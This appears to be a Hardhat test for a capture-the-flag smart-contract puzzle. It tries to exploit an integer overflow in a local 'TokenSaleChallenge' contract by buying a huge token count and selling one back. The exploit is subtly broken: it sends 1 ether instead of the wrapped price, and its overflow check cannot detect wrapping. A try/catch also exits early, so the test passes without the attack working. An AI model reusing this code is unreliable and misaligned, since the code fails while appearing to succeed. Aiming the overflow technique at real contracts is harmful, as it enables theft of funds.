import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, BigNumber } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  const PRICE_PER_TOKEN = utils.parseEther('1'); // 1 ether per token

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    // Calculate number of tokens to buy to exploit overflow
    const numTokensToBuy = BigNumber.from(2).pow(256).div(PRICE_PER_TOKEN).add(1);
    console.log(`Number of tokens to buy: ${numTokensToBuy.toString()}`);

    // Calculate the expected ether value for numTokensToBuy
    const expectedEtherValue = numTokensToBuy.mul(PRICE_PER_TOKEN);
    console.log(`Expected ether value: ${expectedEtherValue.toString()}`);

    // Check if overflow occurs
    const doesOverflow = expectedEtherValue.lt(utils.parseEther('1'));
    console.log(`Does overflow occur: ${doesOverflow}`);

    // Buy tokens
    try {
      await target.buy(numTokensToBuy, { value: utils.parseEther('1') });
      console.log('Buy transaction succeeded');
    } catch (error) {
      console.log('Buy transaction failed:', error);
      return; // Exit the test if buy fails
    }

    // Sell a fraction of the tokens back to the contract
    const numTokensToSell = 1;
    await target.sell(numTokensToSell);

    // Check if the challenge is complete
    expect(await target.isComplete()).to.equal(true);
  });
});
